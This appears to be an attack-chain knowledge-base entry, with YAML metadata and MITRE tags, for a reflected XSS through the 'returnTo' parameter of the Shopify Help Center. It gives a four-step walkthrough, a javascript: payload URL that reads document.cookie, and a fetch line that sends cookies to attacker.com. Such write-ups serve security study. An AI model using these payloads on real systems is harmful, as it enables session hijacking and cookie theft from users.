---
tags:
  - xss
  - reflected-xss
  - shopify
  - javascript-protocol
  - cookie-theft
  - open-redirect
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
complexity: low
procedures:
  - '[[procedures/Craft-Malicious-returnTo-URL-for-XSS]]'
  - '[[procedures/Login-to-Incomplete-Shopify-Account]]'
  - '[[procedures/Trigger-XSS-via-Continue-Button]]'
step_count: 4
techniques:
  - '[[JavaScript]]'
description: >-
  A multi-step attack exploiting a reflected XSS vulnerability in the Shopify
  Help Center's 'returnTo' parameter, allowing arbitrary JavaScript execution to
  steal cookies or perform redirects, requiring an incomplete account state.
skill_level: intermediate
impact_level: high
id: 9ab01f77-f2b9-4566-987e-503b8e29e882
created_at: '2025-12-13T23:55:38.267Z'
updated_at: '2025-12-13T23:55:38.267Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Reflected XSS via javascript: Protocol in Shopify Help Center returnTo Parameter

Multi-stage attack chain demonstrating a complete attack workflow exploiting a reflected XSS in the Shopify Help Center.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Open Malicious URL] --> B[Login to Incomplete Account]
    B --> C[Return and Click Continue]
    C --> D[JavaScript Execution and Cookie Theft]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome, Firefox)

### Target Environment

- Web platform
- Shopify Help Center service
- Access to an incomplete Shopify account (e.g., missing name and last name)

### Initial Access Requirements

- Valid Shopify account in incomplete state
- Ability to lure or use a victim to visit the URL and interact
- No special network access beyond internet connectivity

## Detailed Attack Procedures

### Step 1: Craft and Open Malicious URL
procedure: [[procedures/Craft-Malicious-returnTo-URL-for-XSS]]

**Objective**: Create a URL with injected JavaScript payload using the 'returnTo' parameter to prepare for XSS execution.

**Instructions**: Construct the URL by appending the malicious 'returnTo' parameter to the endpoint. For example, use `https://help.shopify.com/en/support/confirm-account-details?returnTo=javascript:alert(document.cookie)` to inject a payload that alerts cookies.

**Expected Output**: The browser loads the Shopify Help Center page with the parameter reflected but not yet executed.

**Success Indicators**:
- URL loads without errors
- Page source shows the 'returnTo' parameter present

### Step 2: Login to Incomplete Account
procedure: [[procedures/Login-to-Incomplete-Shopify-Account]]

**Objective**: Authenticate with an account in an incomplete state to enable the vulnerability trigger.

**Instructions**: On the loaded page, enter credentials for a Shopify account missing required details like name and last name, then submit the login form.

**Expected Output**: Successful login, redirecting to an account completion prompt.

**Success Indicators**:
- Login succeeds
- Account state remains incomplete, showing prompts for missing details

### Step 3: Return to Malicious URL and Click Continue
procedure: [[procedures/Trigger-XSS-via-Continue-Button]]

**Objective**: Navigate back to the crafted URL and interact to execute the injected JavaScript.

**Instructions**: After login, manually navigate back to the original malicious URL. On the page, locate and click the 'Continue' button to process the 'returnTo' parameter.

**Expected Output**: The JavaScript payload executes, such as an alert displaying document cookies.

**Success Indicators**:
- Alert or redirect occurs
- Cookies are accessible via the payload (e.g., for theft or session hijacking)

### Step 4: Observe and Exfiltrate Data

**Objective**: Verify execution and capture any stolen data like cookies for further exploitation.

**Instructions**: Monitor the browser for the payload's effects, such as alerts or redirects. In a real attack, modify the payload to exfiltrate data to an attacker-controlled server (e.g., `javascript:fetch('https://attacker.com?cookie='+document.cookie)`).

**Expected Output**: Data theft or redirect to malicious site.

**Success Indicators**:
- Payload runs without blocking
- Sensitive data like session cookies is exposed

## Attack Chain Summary

### Key Achievements

1. Successful injection and reflection of JavaScript via 'returnTo' parameter
2. Execution of arbitrary code in the victim's browser context
3. Potential for cookie theft, session hijacking, or phishing redirects

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2024-10-01T00:00:00Z*
